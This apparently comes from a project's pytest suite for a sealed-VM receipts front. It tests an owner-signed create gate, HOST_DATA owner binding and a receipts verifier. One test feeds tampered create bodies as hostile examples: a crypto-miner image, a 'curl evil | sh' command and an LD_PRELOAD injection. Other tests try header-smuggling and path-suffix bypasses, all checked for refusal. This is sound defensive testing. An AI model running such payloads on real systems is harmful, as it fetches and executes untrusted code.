"""Dedicated sealed machine: the owner in HOST_DATA and the owner-signed create gate.

The SNP report and fw_cfg are faked. What is real: room_receipts.py (the
measured front that refuses unsigned creates), verify_receipts.py (the
customer's check), owner_sign.py (the customer's signer) and the HOST_DATA
program in launch-guest.sh.
"""
from __future__ import annotations

import base64
import hashlib
import http.client
import importlib.util
import json
import re
import subprocess
import sys
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

ROOT = Path(__file__).resolve().parents[1]
KIT = ROOT / "room-kit"
API_KEY = b"k" * 32
GUEST = "acme"


def _load(name: str, alias: str):
    spec = importlib.util.spec_from_file_location(alias, KIT / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    return mod


rr = _load("room_receipts", "room_receipts_owner_t")
vr = _load("verify_receipts", "verify_receipts_owner_t")
osign = _load("owner_sign", "owner_sign_owner_t")


def _raw_pub(key: Ed25519PrivateKey) -> bytes:
    return key.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)


def _fake_snp(host_data: bytes):
    """An SNP report reader: fixed launch facts, REPORT_DATA as asked."""
    def snp(report_data: bytes) -> bytes:
        r = bytearray(0x4A0)
        r[0:4] = (3).to_bytes(4, "little")
        r[0x08:0x10] = (0x30000).to_bytes(8, "little")
        r[0x50:0x90] = report_data
        r[0x90:0xC0] = bytes.fromhex("ab" * 48)
        r[0xC0:0xE0] = host_data
        r[0x180:0x188] = bytes.fromhex("01" * 8)
        r[0x1A0:0x1E0] = bytes.fromhex("ef" * 64)
        return bytes(r)
    return snp


class Machine:
    """One faked sealed guest: owner key, manifest digest, fw_cfg and HOST_DATA."""

    def __init__(self, tmp_path: Path, monkeypatch, *, owner: bool = True, host_data: bytes | None = None,
                 fw_key: bytes | None = None, fw_manifest: bytes | None = None):
        self.key = Ed25519PrivateKey.generate()
        self.pub = _raw_pub(self.key)
        self.manifest = hashlib.sha256(b'{"schema":"cathedral_sealed_hotel_guest_v1"}').digest()
        fw = tmp_path / "fw_cfg"
        if owner:
            (fw / "owner-pubkey").mkdir(parents=True)
            (fw / "owner-pubkey" / "raw").write_bytes(self.pub if fw_key is None else fw_key)
            (fw / "manifest-sha256").mkdir(parents=True)
            (fw / "manifest-sha256" / "raw").write_bytes(self.manifest if fw_manifest is None else fw_manifest)
            want = rr.dedicated_host_data(self.manifest, self.pub)
        else:
            fw.mkdir(parents=True)
            want = self.manifest  # the shared launch: HOST_DATA is the manifest digest
        self.host_data = want if host_data is None else host_data
        monkeypatch.setattr(rr, "OWNER_FW_CFG", str(fw))
        monkeypatch.setattr(rr, "tsm_provider", lambda: "sev_guest")
        monkeypatch.setattr(rr, "snp_report", _fake_snp(self.host_data))
        self.store = tmp_path / "store"

    def ledger(self):
        return rr.Ledger("dedicated-1", str(self.store))


# ---------------------------------------------------------------- the binding


def test_dedicated_binding_names_the_owner_and_the_manifest(tmp_path, monkeypatch) -> None:
    m = Machine(tmp_path, monkeypatch)
    ledger = m.ledger()
    b = ledger.binding
    assert ledger.owner_key == m.pub
    assert b["tenancy"] == "dedicated"
    assert base64.b64decode(b["owner_ed25519_b64"]) == m.pub
    assert b["manifest_sha256"] == m.manifest.hex()
    # Recomputable from published fields alone.
    assert b["host_data"] == hashlib.sha256(
        b"cathedral-dedicated-v1\0" + bytes.fromhex(b["manifest_sha256"]) + base64.b64decode(b["owner_ed25519_b64"])
    ).hexdigest()
    # REPORT_DATA still commits to the binding, now with the owner in it.
    assert ledger.report[0x50:0x90] == bytes.fromhex(ledger.binding_sha256) + bytes(32)


def test_shared_binding_says_shared_and_names_no_owner(tmp_path, monkeypatch) -> None:
    m = Machine(tmp_path, monkeypatch, owner=False)
    ledger = m.ledger()
    assert ledger.owner_key is None
    assert ledger.binding["tenancy"] == "shared"
    assert "owner_ed25519_b64" not in ledger.binding and "manifest_sha256" not in ledger.binding
    assert ledger.binding["host_data"] == m.manifest.hex()


def test_level1_binding_is_unchanged(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(rr, "tsm_provider", lambda: None)
    ledger = rr.Ledger("room-a", str(tmp_path))
    assert ledger.owner_key is None
    assert "tenancy" not in ledger.binding


@pytest.mark.parametrize("case", ["shared_host_data", "other_key", "other_manifest", "short_key", "no_manifest"])
def test_an_owner_key_the_report_does_not_name_fails_closed(tmp_path, monkeypatch, case) -> None:
    other = _raw_pub(Ed25519PrivateKey.generate())
    kwargs = {
        "shared_host_data": {"host_data": hashlib.sha256(b"manifest").digest()},
        "other_key": {"fw_key": other},
        "other_manifest": {"fw_manifest": hashlib.sha256(b"another build").digest()},
        "short_key": {"fw_key": b"\x01" * 31},
        "no_manifest": {},
    }[case]
    m = Machine(tmp_path, monkeypatch, **kwargs)
    if case == "no_manifest":
        (tmp_path / "fw_cfg" / "manifest-sha256" / "raw").unlink()
    with pytest.raises(rr.OwnerBindingError):
        m.ledger()


def test_the_front_refuses_to_serve_on_an_owner_mismatch(tmp_path, monkeypatch, capsys) -> None:
    Machine(tmp_path, monkeypatch, host_data=hashlib.sha256(b"manifest").digest())
    key_file = tmp_path / "api.key"
    key_file.write_bytes(API_KEY)
    served = []
    monkeypatch.setattr(rr, "Server", lambda *a, **k: served.append(a))
    monkeypatch.setenv("ROOM_RECEIPTS_LISTEN", "127.0.0.1:0")
    monkeypatch.setenv("ROOM_HOTEL_NAME", "dedicated-1")
    monkeypatch.setenv("ROOM_API_KEY_PATH", str(key_file))
    monkeypatch.setenv("ROOM_RECEIPTS_DIR", str(tmp_path / "store"))
    assert rr.main() == 2
    assert served == []
    assert "REFUSING TO SERVE" in capsys.readouterr().err


# ---------------------------------------------------------------- the gate


@pytest.fixture
def front(tmp_path, monkeypatch):
    """A dedicated machine's receipts front over a fake room API."""
    seen: list[tuple[str, str, bytes]] = []

    class Api(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *args):
            pass

        def _any(self):
            n = int(self.headers.get("Content-Length") or 0)
            seen.append((self.command, self.path, self.rfile.read(n)))
            out = json.dumps({"id": f"sbx_{len(seen)}", "state": "running"}).encode()
            self.send_response(202)
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        do_POST = do_DELETE = do_PUT = _any  # noqa: N815

    api = ThreadingHTTPServer(("127.0.0.1", 0), Api)
    threading.Thread(target=api.serve_forever, daemon=True).start()
    m = Machine(tmp_path, monkeypatch)
    ledger = m.ledger()
    server = rr.Server(("127.0.0.1", 0), ledger, api.server_address[1], 1, API_KEY, "/nonexistent.sock")
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield server.server_address[1], seen, ledger, m
    server.shutdown()
    api.shutdown()


def _broker_form(guest_body: dict, guest: str = GUEST) -> bytes:
    """What broker/main.go sends the hotel for one guest create (Go re-encoding)."""
    doc = json.loads(json.dumps(guest_body))
    if doc.get("network") in (None, ""):
        doc["network"] = {"mode": "deny_all", "allow": []}
    for k in ("hotels", "hotel_labels", "exclude_hotel_labels", "sealed", "placement", "count"):
        doc.pop(k, None)
    labels = doc.get("labels") if isinstance(doc.get("labels"), dict) else {}
    labels["broker_guest"] = guest
    labels["broker_batch"] = str(uuid.uuid4())
    doc["labels"] = labels

    def go_float(v):  # encoding/json: every number is a float64; whole ones print without ".0"
        if isinstance(v, bool) or not isinstance(v, (int, float)):
            return {k: go_float(x) for k, x in v.items()} if isinstance(v, dict) else (
                [go_float(x) for x in v] if isinstance(v, list) else v)
        return int(v) if float(v).is_integer() else float(v)

    return json.dumps(go_float(doc), sort_keys=True, separators=(",", ":")).encode()


def _post(port: int, path: str, body: bytes, headers: dict | None = None) -> tuple[int, dict, dict]:
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    c.request("POST", path, body=body, headers={"Authorization": "Bearer " + API_KEY.decode(),
                                               "Content-Type": "application/json", **(headers or {})})
    r = c.getresponse()
    out = r.read()
    hdrs = dict(r.getheaders())
    c.close()
    return r.status, (json.loads(out) if out else {}), hdrs


def _receipt(hdrs: dict) -> dict:
    raw = hdrs["X-Room-Receipt"]
    return json.loads(base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4)))


GUEST_CREATE = {"image": "alpine:3.20", "cmd": ["sleep", "60"], "resources": {"vcpu": 2.0, "memory_gib": 4},
                "hotels": ["dedicated-1"], "sealed": True, "labels": {"team": "ml"}}


def test_a_create_signed_by_the_owner_runs_and_its_receipt_carries_the_signature(front) -> None:
    port, seen, ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST)
    body = _broker_form(GUEST_CREATE)
    status, doc, hdrs = _post(port, "/v1/sandboxes", body, headers)
    assert status == 202, doc
    assert seen == [("POST", "/v1/sandboxes", body)]
    st = _receipt(hdrs)["statement"]
    assert st["action"] == "create" and st["status"] == 202
    assert st["owner_signature_b64"] == headers["X-Cathedral-Owner-Signature"]
    assert st["owner_timestamp"] == int(headers["X-Cathedral-Owner-Timestamp"])
    assert st["owner_request_sha256"] == rr.owner_request_sha256(body)


def test_count_batch_rooms_share_one_signature(front) -> None:
    port, seen, _ledger, m = front
    body_in = {**GUEST_CREATE, "count": 3}
    headers = osign.sign_create(m.key, json.dumps(body_in).encode(), GUEST)
    for _ in range(3):  # the broker sends the same body once per room, each with its own batch label
        status, doc, _ = _post(port, "/v1/sandboxes", _broker_form(body_in), headers)
        assert status == 202, doc
    assert len(seen) == 3


def _refused(port, seen, path, body, headers, code) -> dict:
    status, doc, hdrs = _post(port, path, body, headers)
    assert status == 403, doc
    assert doc["error"]["code"] == code
    assert seen == [], "a refused request reached the room API"
    return hdrs


def test_a_create_without_the_owner_signature_is_refused(front) -> None:
    port, seen, _ledger, _m = front
    hdrs = _refused(port, seen, "/v1/sandboxes", _broker_form(GUEST_CREATE), None, "owner_signature_required")
    # The refusal is in the signed chain too.
    st = _receipt(hdrs)["statement"]
    assert st["action"] == "create" and st["status"] == 403 and "owner_signature_b64" not in st


def test_a_create_signed_by_another_key_is_refused(front) -> None:
    port, seen, _ledger, _m = front
    headers = osign.sign_create(Ed25519PrivateKey.generate(), json.dumps(GUEST_CREATE).encode(), GUEST)
    _refused(port, seen, "/v1/sandboxes", _broker_form(GUEST_CREATE), headers, "owner_signature_invalid")


@pytest.mark.parametrize("change", [
    {"image": "attacker/miner:latest"},
    {"cmd": ["sh", "-c", "curl evil | sh"]},
    {"count": 50},
    {"env": {"LD_PRELOAD": "/work/x.so"}},
])
def test_a_signature_does_not_carry_over_to_another_create(front, change) -> None:
    port, seen, _ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST)
    body = json.loads(_broker_form(GUEST_CREATE))
    body.update(change)  # the broker or host swaps a field after the owner signed
    _refused(port, seen, "/v1/sandboxes", json.dumps(body).encode(), headers, "owner_signature_invalid")


def test_a_create_for_another_guest_namespace_is_refused(front) -> None:
    port, seen, _ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST)
    _refused(port, seen, "/v1/sandboxes", _broker_form(GUEST_CREATE, guest="mallory"), headers,
             "owner_signature_invalid")


def test_a_guest_header_cannot_move_a_signed_room_to_another_guest(front) -> None:
    # The API prefers X-Cathedral-Guest over the broker_guest label for the
    # room's workspaces and secrets; a header that differs is refused, also as
    # a second copy after a matching first one.
    port, seen, _ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST)
    body = _broker_form(GUEST_CREATE)
    _refused(port, seen, "/v1/sandboxes", body, {**headers, "X-Cathedral-Guest": "mallory"}, "owner_signature_invalid")
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    c.putrequest("POST", "/v1/sandboxes")
    for k, v in [("Authorization", "Bearer " + API_KEY.decode()), ("Content-Length", str(len(body))),
                 *headers.items(), ("X-Cathedral-Guest", GUEST), ("x-cathedral-guest", "mallory")]:
        c.putheader(k, v)
    c.endheaders(body)
    r = c.getresponse()
    assert r.status == 403 and json.loads(r.read())["error"]["code"] == "owner_signature_invalid"
    c.close()
    assert seen == []
    # The same guest in the header is fine.
    status, doc, _ = _post(port, "/v1/sandboxes", body, {**headers, "X-Cathedral-Guest": GUEST})
    assert status == 202, doc


@pytest.mark.parametrize("skew", [-301, 301, -100000])
def test_an_old_or_future_timestamp_is_refused(front, skew) -> None:
    port, seen, _ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST, now=int(time.time()) + skew)
    _refused(port, seen, "/v1/sandboxes", _broker_form(GUEST_CREATE), headers, "owner_signature_invalid")


@pytest.mark.parametrize("headers", [
    {"X-Cathedral-Owner-Timestamp": "now", "X-Cathedral-Owner-Signature": "AAAA"},
    {"X-Cathedral-Owner-Timestamp": "1e9", "X-Cathedral-Owner-Signature": "AAAA"},
])
def test_a_malformed_timestamp_is_refused(front, headers) -> None:
    port, seen, _ledger, _m = front
    _refused(port, seen, "/v1/sandboxes", _broker_form(GUEST_CREATE), headers, "owner_signature_invalid")


def test_a_params_suffix_does_not_slip_past_the_gate(front) -> None:
    # The API routes with urlparse, which drops ";x"; the gate must see the same path.
    port, seen, _ledger, _m = front
    _refused(port, seen, "/v1/sandboxes;x", _broker_form(GUEST_CREATE), None, "owner_signature_required")
    _refused(port, seen, "/v1/sandboxes?count=9", _broker_form(GUEST_CREATE), None, "owner_signature_required")


def test_an_image_build_needs_its_own_owner_signature(front) -> None:
    port, seen, _ledger, m = front
    build = json.dumps({"dockerfile": "FROM alpine:3.20\nRUN echo hi\n"}).encode()
    _refused(port, seen, "/v1/images/build", build, None, "owner_signature_required")
    # A create signature over the same digest is not a build signature.
    ts = str(int(time.time()))
    digest = rr.owner_request_sha256(build)
    as_create = base64.b64encode(m.key.sign(rr.owner_message("create", ts, digest))).decode()
    _refused(port, seen, "/v1/images/build", build,
             {"X-Cathedral-Owner-Timestamp": ts, "X-Cathedral-Owner-Signature": as_create}, "owner_signature_invalid")
    as_build = base64.b64encode(m.key.sign(rr.owner_message("build", ts, digest))).decode()
    status, doc, _ = _post(port, "/v1/images/build", build,
                           {"X-Cathedral-Owner-Timestamp": ts, "X-Cathedral-Owner-Signature": as_build})
    assert status == 202, doc
    assert len(seen) == 1


def test_room_operations_other_than_create_are_not_gated(front) -> None:
    port, seen, _ledger, _m = front
    status, _doc, _ = _post(port, "/v1/sandboxes/sbx_1/exec", b'{"cmd":["true"]}')
    assert status == 202 and len(seen) == 1


def test_a_shared_machine_has_no_gate(tmp_path, monkeypatch) -> None:
    seen: list[bytes] = []

    class Api(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *args):
            pass

        def do_POST(self):  # noqa: N802
            seen.append(self.rfile.read(int(self.headers.get("Content-Length") or 0)))
            out = b'{"id":"sbx_1"}'
            self.send_response(202)
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

    api = ThreadingHTTPServer(("127.0.0.1", 0), Api)
    threading.Thread(target=api.serve_forever, daemon=True).start()
    ledger = Machine(tmp_path, monkeypatch, owner=False).ledger()
    server = rr.Server(("127.0.0.1", 0), ledger, api.server_address[1], 1, API_KEY, "/nonexistent.sock")
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        status, _doc, hdrs = _post(server.server_address[1], "/v1/sandboxes", _broker_form(GUEST_CREATE))
        assert status == 202 and len(seen) == 1
        assert "owner_signature_b64" not in _receipt(hdrs)["statement"]
    finally:
        server.shutdown()
        api.shutdown()


# ---------------------------------------------------------------- owner_sign.py


def test_owner_sign_refuses_bodies_the_broker_rewrites() -> None:
    key = Ed25519PrivateKey.generate()
    for body in ({"template": "python-3.12"}, {"image": "alpine:3.20", "snapshot_id": "b.snap_1"}, [1, 2]):
        with pytest.raises(ValueError):
            osign.sign_create(key, json.dumps(body).encode(), GUEST)
    with pytest.raises(ValueError):
        osign.sign_create(key, b'{"image":"alpine:3.20"}', "")


def test_owner_sign_names_a_workspace_as_the_hotel_sees_it(front) -> None:
    port, seen, _ledger, m = front
    for ws, sent in (("dedicated-1.data", "data"), ({"name": "dedicated-1.data", "mount": "/work"},
                                                      {"name": "data", "mount": "/work"})):
        guest_body = {**GUEST_CREATE, "workspace": ws}
        headers = osign.sign_create(m.key, json.dumps(guest_body).encode(), GUEST)
        # broker/workspaces.go: findWorkspace cuts "<hotel>." and setWorkspaceName sends the rest.
        status, doc, _ = _post(port, "/v1/sandboxes", _broker_form({**guest_body, "workspace": sent}), headers)
        assert status == 202, doc


def test_owner_sign_cli_prints_two_curl_headers_and_the_public_key(tmp_path) -> None:
    key = Ed25519PrivateKey.generate()
    pem = tmp_path / "owner.pem"
    pem.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                      serialization.NoEncryption()))
    body = tmp_path / "create.json"
    body.write_text(json.dumps(GUEST_CREATE))
    run = lambda *a: subprocess.run([sys.executable, str(KIT / "owner_sign.py"), "--key", str(pem), *a],  # noqa: E731
                                    capture_output=True, text=True, check=True).stdout
    lines = run("--guest", GUEST, "--body", str(body), "--timestamp", "1761700000").splitlines()
    assert lines[0] == "X-Cathedral-Owner-Timestamp: 1761700000"
    assert re.fullmatch(r"X-Cathedral-Owner-Signature: [A-Za-z0-9+/]{86}==", lines[1])
    assert len(lines) == 2
    raw_out = tmp_path / "owner.pub"
    assert base64.b64decode(run("--public", "--raw-out", str(raw_out)).strip()) == _raw_pub(key)
    assert raw_out.read_bytes() == _raw_pub(key)


# ---------------------------------------------------------------- launch-guest.sh


def _launch_program() -> str:
    text = (KIT / "sealed" / "launch-guest.sh").read_text()
    m = re.search(r"<<'EOF'\n(.*?)\nEOF\n", text, re.S)
    assert m, "no HOST_DATA program in launch-guest.sh"
    return m.group(1)


def test_launch_host_data_is_what_the_guest_and_the_verifier_recompute(tmp_path) -> None:
    manifest = tmp_path / "manifest.json"
    manifest.write_text('{"schema":"cathedral_sealed_hotel_guest_v1","hotel":"dedicated-1"}')
    owner = _raw_pub(Ed25519PrivateKey.generate())
    (tmp_path / "owner.pub").write_bytes(owner)
    out = subprocess.run([sys.executable, "-c", _launch_program(), str(manifest), str(tmp_path / "owner.pub"),
                          str(tmp_path / "manifest.sha256")], capture_output=True, text=True, check=True).stdout
    digest = hashlib.sha256(manifest.read_bytes()).digest()
    assert (tmp_path / "manifest.sha256").read_bytes() == digest
    assert base64.b64decode(out.strip()) == rr.dedicated_host_data(digest, owner)
    assert base64.b64decode(out.strip()) == hashlib.sha256(vr.DEDICATED_HOST_DATA_DOMAIN + digest + owner).digest()
    # The fw_cfg names the guest reads are the names QEMU gets.
    text = (KIT / "sealed" / "launch-guest.sh").read_text()
    assert "name=opt/cathedral/owner-pubkey,file=$SEALED_OWNER_PUBKEY_FILE" in text
    assert "name=opt/cathedral/manifest-sha256,file=$RUN/manifest.sha256" in text
    assert rr.OWNER_FW_CFG == "/sys/firmware/qemu_fw_cfg/by_name/opt/cathedral"


def test_launch_refuses_an_owner_key_file_that_is_not_32_raw_bytes(tmp_path) -> None:
    manifest = tmp_path / "manifest.json"
    manifest.write_text("{}")
    b64_key = tmp_path / "owner.b64"
    b64_key.write_text(base64.b64encode(b"\x01" * 32).decode() + "\n")
    proc = subprocess.run([sys.executable, "-c", _launch_program(), str(manifest), str(b64_key),
                           str(tmp_path / "manifest.sha256")], capture_output=True, text=True)
    assert proc.returncode != 0 and "32 raw bytes" in proc.stderr


# ---------------------------------------------------------------- verify_receipts.py --owner-pubkey


def _verify(tmp_path: Path, att: dict, receipts: list, *flags: str) -> dict:
    (tmp_path / "att.json").write_text(json.dumps(att))
    (tmp_path / "chain.json").write_text(json.dumps({"receipts": receipts}))
    proc = subprocess.run([sys.executable, str(KIT / "verify_receipts.py"), "--attestation", str(tmp_path / "att.json"),
                           "--receipts", str(tmp_path / "chain.json"), "--skip-amd", *flags],
                          capture_output=True, text=True)
    return json.loads(proc.stdout)


def _signed_chain(front) -> tuple[dict, list, Machine]:
    port, _seen, ledger, m = front
    headers = osign.sign_create(m.key, json.dumps(GUEST_CREATE).encode(), GUEST)
    assert _post(port, "/v1/sandboxes", _broker_form(GUEST_CREATE), headers)[0] == 202
    assert _post(port, "/v1/sandboxes", _broker_form(GUEST_CREATE))[0] == 403  # refused attempts stay in the chain
    return ledger.attestation(), list(ledger.chain), m


def test_verifier_passes_the_owner_of_a_dedicated_machine(front, tmp_path) -> None:
    att, chain, m = _signed_chain(front)
    out = _verify(tmp_path, att, chain, "--owner-pubkey", base64.b64encode(m.pub).decode(),
                  "--expected-measurement", "ab" * 48)
    assert out["verdict"] == "PASS", out
    owner = out["attestation"]["owner"]
    assert owner["tenancy"] == "dedicated" and owner["signed_creates"] == 1
    assert owner["host_data"] == rr.dedicated_host_data(m.manifest, m.pub).hex()


def test_verifier_fails_another_owner(front, tmp_path) -> None:
    att, chain, _m = _signed_chain(front)
    other = base64.b64encode(_raw_pub(Ed25519PrivateKey.generate())).decode()
    out = _verify(tmp_path, att, chain, "--owner-pubkey", other)
    assert out["verdict"] == "FAIL" and "another owner" in out["reason"]


def test_verifier_fails_a_successful_create_without_the_owner_signature(front, tmp_path) -> None:
    att, chain, m = _signed_chain(front)
    # A receipt chain where a create ran with no owner fields (a gate that did not run).
    key = Ed25519PrivateKey.generate()
    binding = {**att["binding"], "receipt_key_ed25519_b64": base64.b64encode(_raw_pub(key)).decode()}
    att2 = _att_for(binding, m)
    st = {**chain[0]["statement"], "binding_sha256": att2["binding_sha256"], "previous_receipt_sha256": att2["binding_sha256"],
          "sequence": 1}
    for k in ("owner_signature_b64", "owner_timestamp", "owner_request_sha256"):
        st.pop(k)
    rc = {"statement": st, "signature_b64": base64.b64encode(key.sign(rr.canonical(st))).decode(),
          "receipt_sha256": rr.sha(rr.canonical(st))}
    out = _verify(tmp_path, att2, [rc], "--owner-pubkey", base64.b64encode(m.pub).decode())
    assert out["verdict"] == "FAIL" and "no owner signature" in out["reason"]


def _att_for(binding: dict, m: Machine, host_data: bytes | None = None) -> dict:
    bsha = rr.sha(rr.canonical(binding))
    report = _fake_snp(bytes.fromhex(binding["host_data"]) if host_data is None else host_data)(
        bytes.fromhex(bsha) + bytes(32))
    return {"binding": binding, "binding_sha256": bsha, "report_b64": base64.b64encode(report).decode()}


def test_verifier_fails_host_data_that_does_not_commit_to_the_owner(tmp_path, monkeypatch) -> None:
    m = Machine(tmp_path, monkeypatch)
    binding = {**m.ledger().binding, "host_data": hashlib.sha256(b"manifest").hexdigest()}
    out = _verify(tmp_path, _att_for(binding, m), [], "--owner-pubkey", base64.b64encode(m.pub).decode())
    assert out["verdict"] == "FAIL" and "does not commit" in out["reason"]


def test_verifier_fails_a_shared_machine_and_a_level1_hotel(tmp_path, monkeypatch) -> None:
    m = Machine(tmp_path / "shared", monkeypatch, owner=False)
    pub = base64.b64encode(m.pub).decode()
    out = _verify(tmp_path, m.ledger().attestation(), [], "--owner-pubkey", pub)
    assert out["verdict"] == "FAIL" and "shared" in out["reason"]
    monkeypatch.setattr(rr, "tsm_provider", lambda: None)
    level1 = rr.Ledger("room-a", str(tmp_path / "l1"))
    out = _verify(tmp_path, level1.attestation(), [], "--owner-pubkey", pub)
    assert out["verdict"] == "FAIL" and "level 1" in out["reason"]
